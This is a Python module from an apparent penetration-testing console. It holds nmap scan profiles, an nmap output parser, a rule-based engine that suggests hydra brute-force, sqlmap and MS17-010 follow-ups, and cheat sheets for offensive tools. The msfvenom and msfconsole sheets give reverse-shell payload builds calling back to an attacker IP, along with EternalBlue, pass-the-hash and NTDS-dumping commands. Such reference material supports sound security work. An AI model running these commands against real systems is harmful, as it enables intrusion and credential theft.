"""Curated cheat sheets, scan profiles, nmap parser, and follow-up suggestion engine."""
from __future__ import annotations
import re
from spectrenet.theme import CYAN, WHITE, GREY

# ---------------------------------------------------------------------------
# Scan profiles — expand to full nmap flag strings
# ---------------------------------------------------------------------------

SCAN_PROFILES: dict[str, str] = {
    "quick":   "-T4 -F",
    "full":    "-T4 -sV -sC -A -p-",
    "stealth": "-T2 -sS -f",
    "web":     "-T4 -sV -sC -p 80,443,8080,8443,8000,3000,5000",
    "udp":     "-T4 -sU --top-ports 200",
    "vuln":    "-T4 --script vuln",
    "os":      "-T4 -O -sV",
}

# ---------------------------------------------------------------------------
# Nmap text-output parser
# ---------------------------------------------------------------------------

_REPORT_RE = re.compile(r"Nmap scan report for (?:\S+ \()?(\d[\d.]+)\)?")
_PORT_RE   = re.compile(r"^\s*(\d+)/(tcp|udp)\s+open\s+(\S+)(?:\s+(.*))?")


def parse_nmap_text(output: str) -> dict[str, list[dict]]:
    """Return {ip: [{port, proto, service, version}]} from nmap text output."""
    hosts: dict[str, list[dict]] = {}
    current_ip: str | None = None
    for line in output.splitlines():
        m = _REPORT_RE.search(line)
        if m:
            current_ip = m.group(1)
            hosts.setdefault(current_ip, [])
            continue
        if current_ip:
            m = _PORT_RE.match(line)
            if m:
                hosts[current_ip].append({
                    "port":    int(m.group(1)),
                    "proto":   m.group(2),
                    "service": m.group(3),
                    "version": (m.group(4) or "").strip()[:25],
                })
    return hosts

# ---------------------------------------------------------------------------
# Follow-up suggestion engine
# ---------------------------------------------------------------------------


def suggest_followups(tool: str, output: str, args: list[str]) -> list[str]:
    """Rule-based follow-up suggestions after a tool run. Returns up to 4 commands."""
    target = ""
    for arg in args:
        if not arg.startswith("-") and arg:
            target = arg
            break

    suggestions: list[str] = []

    if tool in ("nmap", "masscan"):
        if "22/tcp" in output and "open" in output:
            suggestions.append(f"hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://{target}")
        if "21/tcp" in output and "open" in output:
            suggestions.append(f"hydra -l anonymous -p anonymous ftp://{target}")
        for port, proto in [("80", "http"), ("8080", "http"), ("443", "https"), ("8443", "https")]:
            if f"{port}/tcp" in output and "open" in output:
                suggestions.append(f"nikto -h {proto}://{target}:{port}")
                suggestions.append(f"gobuster dir -u {proto}://{target}:{port} -w /usr/share/wordlists/dirb/common.txt")
                break
        if "3306/tcp" in output and "open" in output:
            suggestions.append(f"sqlmap -u http://{target}/ --batch --dbs")
        if any(p in output for p in ["445/tcp", "139/tcp"]) and "open" in output:
            suggestions.append(f"msf use auxiliary/scanner/smb/smb_ms17_010 RHOSTS={target}")
    elif tool in ("nikto", "gobuster"):
        if ".php" in output or "PHP" in output:
            suggestions.append(f"sqlmap -u http://{target}/ --batch --forms --dbs")
        if "login" in output.lower() or "admin" in output.lower():
            suggestions.append(
                f"hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt "
                f"-P /usr/share/wordlists/rockyou.txt {target} "
                f"http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'"
            )

    return suggestions[:4]

# ---------------------------------------------------------------------------
# Cheat sheets — Rich markup strings (used in both Classic and AI screens)
# ---------------------------------------------------------------------------

CHEATSHEETS: dict[str, str] = {
    "nmap": f"""\
[bold {CYAN}]── nmap ──────────────────────────────────────────────────────────────────[/]
[bold {WHITE}]SCAN TYPES[/]
  -sS  SYN scan (stealthy, root)   -sT  TCP connect    -sU  UDP
  -sV  Version detection           -sC  Default scripts  -A  All (-O -sV -sC)
  -O   OS detection

[bold {WHITE}]PORTS[/]
  -p 22,80,443    Specific   -p 1-10000  Range   -p-  All 65535   -F  Top 100
  --top-ports 100

[bold {WHITE}]TIMING  [dim](0=paranoid → 5=insane, T4 recommended)[/]
[/]  -T2  Sneaky    -T3  Normal    -T4  Fast    -T5  Insane

[bold {WHITE}]OUTPUT[/]
  -oX out.xml  XML (parseable)   -oG out.gnmap  Grepable   -oN out.txt  Normal
  -v / -vv     Verbose

[bold {WHITE}]SPECTRENET SCAN PROFILES[/]
  scan quick   <ip>   → nmap -T4 -F                       (fast, top 100 ports)
  scan full    <ip>   → nmap -T4 -sV -sC -A -p-           (thorough)
  scan stealth <ip>   → nmap -T2 -sS -f                   (low-noise)
  scan web     <ip>   → nmap -T4 -sV -sC -p 80,443,8080,8443
  scan udp     <ip>   → nmap -T4 -sU --top-ports 200
  scan vuln    <ip>   → nmap -T4 --script vuln
  scan os      <ip>   → nmap -T4 -O -sV

[bold {WHITE}]EXAMPLES[/]
  [cyan]nmap 10.0.0.1 -sV -sC -p 22,80,443[/]
  [cyan]nmap 10.0.0.0/24 -T4 -F --open[/]
  [cyan]scan full 10.0.0.1[/]
""",

    "masscan": f"""\
[bold {CYAN}]── masscan ───────────────────────────────────────────────────────────────[/]
[bold {WHITE}]CORE[/]
  masscan <target> -p <ports> [options]

[bold {WHITE}]PORTS[/]
  -p 80          Single    -p 80,443,22  Multiple    -p 1-1000  Range
  -p 0-65535     All       -p U:53       UDP port

[bold {WHITE}]RATE[/]
  --rate 1000    Safe for LANs     --rate 100000  Fast (may alert IDS)

[bold {WHITE}]OUTPUT[/]
  -oL out.txt  List    -oX out.xml  XML    -oG out.gnmap  Grepable

[bold {WHITE}]OPTIONS[/]
  --banners      Grab banners         --open-only   Only open ports
  --exclude IP   Skip an IP           --wait 3      Wait 3s after last probe

[bold {WHITE}]EXAMPLES[/]
  [cyan]masscan 10.0.0.0/24 -p 80,443,22 --rate 1000[/]
  [cyan]masscan 10.0.0.1 -p 0-65535 --rate 10000 -oX out.xml[/]
""",

    "sqlmap": f"""\
[bold {CYAN}]── sqlmap ────────────────────────────────────────────────────────────────[/]
[bold {WHITE}]TARGET[/]
  -u <url>           GET target          --data "..."   POST body
  --cookie "..."     Cookie header       -r req.txt     Load from saved HTTP request

[bold {WHITE}]DETECTION[/]
  --level 1-5        Aggressiveness (default 1)
  --risk 1-3         Risk level (3 may alter data)
  --dbms mysql       Force DBMS: mysql/mssql/oracle/postgresql/sqlite
  --technique BEUST  B=Boolean E=Error U=Union S=Stacked T=Time-based

[bold {WHITE}]EXTRACTION[/]
  --dbs                    List databases
  -D db --tables           Tables in database
  -D db -T tbl --dump      Dump table
  --users / --passwords    DB credentials

[bold {WHITE}]EVASION[/]
  --tamper=space2comment   WAF bypass   --random-agent   Random UA
  --delay 2                Slow down    --batch          Auto yes

[bold {WHITE}]EXAMPLES[/]
  [cyan]sqlmap -u "http://10.0.0.1/page?id=1" --dbs --batch[/]
  [cyan]sqlmap -u "http://10.0.0.1/login" --data "u=a&p=b" --level 3 --batch[/]
  [cyan]sqlmap -r request.txt --level 5 --risk 3 --batch --dbs[/]
""",

    "msfvenom": f"""\
[bold {CYAN}]── msfvenom ──────────────────────────────────────────────────────────────[/]
[bold {WHITE}]SYNTAX[/]
  msfvenom -p <payload> [OPTIONS] -f <format> > <output>

[bold {WHITE}]COMMON PAYLOADS[/]
  windows/x64/shell_reverse_tcp          Stageless shell (x64)
  windows/x64/meterpreter/reverse_tcp    Meterpreter (staged, x64)
  windows/x86/shell_reverse_tcp          Stageless shell (x86)
  linux/x64/shell_reverse_tcp            Linux stageless shell
  linux/x64/meterpreter/reverse_tcp      Linux Meterpreter
  php/meterpreter/reverse_tcp            PHP web shell
  cmd/unix/reverse_bash                  Bash one-liner

[bold {WHITE}]OPTIONS[/]
  LHOST=<ip>     Your attacker IP         LPORT=4444   Listen port
  -e x86/shikata_ga_nai  Encoder          -i 5         Encoding iterations
  -x base.exe    Inject into exe          -k           Keep original behaviour
  --list payloads | grep <filter>         Search payloads

[bold {WHITE}]FORMATS[/]
  -f exe   -f elf   -f raw   -f python   -f php   -f asp   -f jar   -f ps1

[bold {WHITE}]EXAMPLES[/]
  [cyan]msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe > shell.exe[/]
  [cyan]msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf > shell.elf[/]
  [cyan]msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw > shell.php[/]
""",

    "nikto": f"""\
[bold {CYAN}]── nikto ─────────────────────────────────────────────────────────────────[/]
[bold {WHITE}]CORE[/]
  -h <host>         Target (IP, hostname, or full URL)
  -p <port>         Port (default 80)
  -ssl              Force SSL/HTTPS

[bold {WHITE}]SCAN OPTIONS[/]
  -Tuning x         Test categories: 1=files 2=misconfig 4=XSS 6=DoS 9=SQL
  -nossl            Skip SSL tests
  -id user:pass     HTTP Basic Auth    -useragent UA   Custom UA

[bold {WHITE}]OUTPUT[/]
  -o out.html       Report file (format from extension: html/csv/xml/txt)
  -Format html      Force format       -Display V    Verbose

[bold {WHITE}]EXAMPLES[/]
  [cyan]nikto -h 10.0.0.1[/]
  [cyan]nikto -h 10.0.0.1 -p 8080[/]
  [cyan]nikto -h https://10.0.0.1 -ssl -o report.html[/]
  [cyan]nikto -h 10.0.0.1 -Tuning 1,2,4[/]
""",

    "nuclei": f"""\
[bold {CYAN}]── nuclei ────────────────────────────────────────────────────────────────[/]
[bold {WHITE}]TARGETS[/]
  -u <url>           Single URL         -l targets.txt   URL list

[bold {WHITE}]TEMPLATES[/]
  -t cves/           CVE templates          -t technologies/  Fingerprinting
  -t vulnerabilities/ General vulns         -t exposures/    Exposed files
  -t misconfiguration/ Misconfigs
  -tags rce          Filter by tag (rce,sqli,xss,lfi,ssrf...)
  -severity critical,high  Filter by severity
  -update-templates  Update template library

[bold {WHITE}]RATE & OUTPUT[/]
  -rl 50    Rate limit (req/s)   -c 25    Concurrency   -timeout 5  Per-request
  -o out.txt  Save to file       -json   JSON output   -silent  Findings only

[bold {WHITE}]EXAMPLES[/]
  [cyan]nuclei -u http://10.0.0.1 -t cves/ -severity critical,high[/]
  [cyan]nuclei -l targets.txt -tags rce,sqli -c 50 -o findings.txt[/]
  [cyan]nuclei -u http://10.0.0.1 -t technologies/ -silent[/]
""",

    "gobuster": f"""\
[bold {CYAN}]── gobuster ──────────────────────────────────────────────────────────────[/]
[bold {WHITE}]MODES[/]
  dir    Directory/file brute-force
  dns    DNS subdomain enumeration
  vhost  Virtual host brute-force

[bold {WHITE}]DIR OPTIONS[/]
  -u <url>       Target URL           -w <wordlist>    Wordlist
  -x php,html    Extensions           -t 50            Threads (default 10)
  -k             Skip TLS verify      -b 404           Status to exclude
  -s 200,301     Status to include    -o out.txt       Output file

[bold {WHITE}]WORDLISTS[/]
  /usr/share/wordlists/dirb/common.txt                        Small (~4k)
  /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  Medium (~220k)
  /usr/share/seclists/Discovery/Web-Content/                    SecLists

[bold {WHITE}]EXAMPLES[/]
  [cyan]gobuster dir -u http://10.0.0.1 -w /usr/share/wordlists/dirb/common.txt[/]
  [cyan]gobuster dir -u http://10.0.0.1 -w dir-medium.txt -x php,html,txt -t 50[/]
  [cyan]gobuster dns -d example.com -w subdomains-top1million-5000.txt[/]
""",

    "hydra": f"""\
[bold {CYAN}]── hydra ─────────────────────────────────────────────────────────────────[/]
[bold {WHITE}]SYNTAX[/]
  hydra -l user -p pass <service>://host
  hydra -L users.txt -P passwords.txt <service>://host

[bold {WHITE}]CREDENTIALS[/]
  -l user    Single username    -L file  Username list
  -p pass    Single password    -P file  Password list
  -C creds.txt   Colon-separated user:pass file

[bold {WHITE}]SERVICES[/]
  ssh  ftp  telnet  rdp  smb  mysql  postgres  vnc
  http-get  http-post-form  https-post-form

[bold {WHITE}]OPTIONS[/]
  -t 4       Threads (careful with ssh)   -f   Stop after first valid cred
  -s port    Port override               -o out.txt  Save output
  -v / -V    Verbose / show each attempt

[bold {WHITE}]HTTP FORM SYNTAX[/]
  hydra 10.0.0.1 http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"

[bold {WHITE}]WORDLISTS[/]
  /usr/share/wordlists/rockyou.txt          Classic passwords
  /usr/share/seclists/Passwords/...         SecLists passwords
  /usr/share/seclists/Usernames/...         SecLists usernames

[bold {WHITE}]EXAMPLES[/]
  [cyan]hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.1[/]
  [cyan]hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ftp://10.0.0.1 -t 4 -f[/]
  [cyan]hydra -l admin -P passwords.txt 10.0.0.1 http-post-form "/login:user=^USER^&pass=^PASS^:Wrong"[/]
""",
}

CHEATSHEETS["enum4linux"] = f"""\
[bold {CYAN}]── enum4linux ────────────────────────────────────────────────────────────[/]
[bold {WHITE}]CORE[/]
  enum4linux [options] <target>

[bold {WHITE}]KEY FLAGS[/]
  -a   All checks (default, recommended)
  -U   Get userlist            -G   Get group list
  -S   Get sharelist           -P   Get password policy
  -r   Enumerate via RID cycling  -o  Get OS info
  -n   NetBIOS info            -w  Get workgroup/domain

[bold {WHITE}]OUTPUT FIELDS[/]
  users, groups, shares, os (OS fingerprint)

[bold {WHITE}]EXAMPLES[/]
  [cyan]enum4linux -a 10.0.0.1[/]
  [cyan]enum4linux -U -G 10.0.0.1[/]
  [cyan]enum4linux -r -d 10.0.0.1[/]

[bold {WHITE}]FOLLOW-UPS[/]
  crackmapexec smb <ip> -u <user> -p <pass>   Spray found users
  smbclient //<ip>/<share> -N                  Access share anonymously
"""

CHEATSHEETS["whatweb"] = f"""\
[bold {CYAN}]── whatweb ───────────────────────────────────────────────────────────────[/]
[bold {WHITE}]CORE[/]
  whatweb [options] <url>

[bold {WHITE}]AGGRESSION LEVELS[/]
  -a 1   Passive (default)    -a 3  Aggressive (more requests)

[bold {WHITE}]OUTPUT[/]
  --color=never     No ANSI (for SpectreNet parsing)
  --log-json=f      JSON output    -v  Verbose plugin output

[bold {WHITE}]WHAT IT DETECTS[/]
  Web server, CMS, frameworks, jQuery, Apache/Nginx/PHP versions,
  login pages, cookies, security headers

[bold {WHITE}]EXAMPLES[/]
  [cyan]whatweb http://10.0.0.1[/]
  [cyan]whatweb -a 3 http://10.0.0.1[/]
  [cyan]whatweb --color=never -v http://10.0.0.1[/]
"""

CHEATSHEETS["searchsploit"] = f"""\
[bold {CYAN}]── searchsploit ──────────────────────────────────────────────────────────[/]
[bold {WHITE}]CORE[/]
  searchsploit <keyword> [keyword ...]

[bold {WHITE}]KEY FLAGS[/]
  --json              Machine-readable JSON output
  -t                  Search titles only   -e  Exact match
  -m <edb-id>         Mirror exploit to current directory
  -x <edb-id>         Examine/cat the exploit
  --update            Update exploit-db local copy

[bold {WHITE}]OUTPUT FIELDS[/]
  title, edb_id, path, type (remote/local/webapps), platform, date

[bold {WHITE}]EXAMPLES[/]
  [cyan]searchsploit apache 2.4.49[/]
  [cyan]searchsploit --json vsftpd 2.3.4[/]
  [cyan]searchsploit -m 50383[/]          Mirror exploit to current dir
  [cyan]searchsploit -x 50383[/]          Examine exploit code
"""

CHEATSHEETS["crackmapexec"] = f"""\
[bold {CYAN}]── crackmapexec / netexec ────────────────────────────────────────────────[/]
[bold {WHITE}]SYNTAX[/]
  crackmapexec <proto> <target> [options]
  netexec / nxc <proto> <target> [options]       (newer alias)

[bold {WHITE}]PROTOCOLS[/]
  smb   ssh   winrm   rdp   ldap   mssql   ftp

[bold {WHITE}]CREDENTIAL OPTIONS[/]
  -u user / -U users.txt     -p pass / -P passes.txt
  -H HASH                    Pass-the-Hash (NTLM)
  --no-bruteforce            Test each user:pass pair (no spray)

[bold {WHITE}]SMB ACTIONS[/]
  --shares      Enumerate shares     --users   Enumerate users
  --sam         Dump SAM hashes      --ntds    Dump NTDS.dit
  -x <cmd>      Execute command      -X <cmd>  PowerShell

[bold {WHITE}]EXAMPLES[/]
  [cyan]crackmapexec smb 10.0.0.0/24[/]                     Network discovery
  [cyan]crackmapexec smb 10.0.0.1 -u admin -p pass --shares[/]
  [cyan]crackmapexec smb 10.0.0.1 -u users.txt -p rockyou.txt[/]
  [cyan]crackmapexec smb 10.0.0.1 -u admin -H aad3b435...[/]  Pass-the-Hash
  [cyan]crackmapexec ssh 10.0.0.1 -u root -p root -x 'id'[/]

[bold {WHITE}]SIGNS OF SUCCESS[/]
  [+] = valid credentials    Pwn3d! = admin confirmed
"""

CHEATSHEETS["msfconsole"] = f"""\
[bold {CYAN}]── msfconsole ────────────────────────────────────────────────────────────[/]
[bold {WHITE}]ENTER MSF CONSOLE[/]
  Type [cyan]msf[/] to enter interactive MSF console mode inside SpectreNet.
  Type [cyan]exit[/] or [cyan]back[/] to return to Classic mode.

[bold {WHITE}]NAVIGATION[/]
  use <module>       Load a module        search <keyword>  Search modules
  back               Exit module context  info              Module info
  show options       Show required opts   show payloads     Compatible payloads

[bold {WHITE}]COMMON MODULES[/]
  use exploit/windows/smb/ms17_010_eternalblue    EternalBlue
  use exploit/multi/handler                        Listener
  use auxiliary/scanner/portscan/tcp               Port scanner
  use auxiliary/scanner/smb/smb_ms17_010           Check for MS17-010
  use post/multi/recon/local_exploit_suggester     Local privesc suggester

[bold {WHITE}]SET OPTIONS[/]
  set RHOSTS 10.0.0.1      set RPORT 445
  set LHOST 10.0.0.1       set LPORT 4444
  set PAYLOAD windows/x64/meterpreter/reverse_tcp

[bold {WHITE}]RUN[/]
  run / exploit            Execute     check   Check vuln without exploiting
  jobs                     Active jobs  kill <id>  Kill job

[bold {WHITE}]SESSIONS[/]
  sessions -l              List sessions
  sessions -i <id>         Interact with session
  sessions -k <id>         Kill session

[bold {WHITE}]EXAMPLES[/]
  [cyan]msf use exploit/windows/smb/ms17_010_eternalblue[/]
  [cyan]msf set RHOSTS 10.0.0.1[/]
  [cyan]msf set PAYLOAD windows/x64/meterpreter/reverse_tcp[/]
  [cyan]msf set LHOST 10.0.0.1[/]
  [cyan]msf run[/]
"""
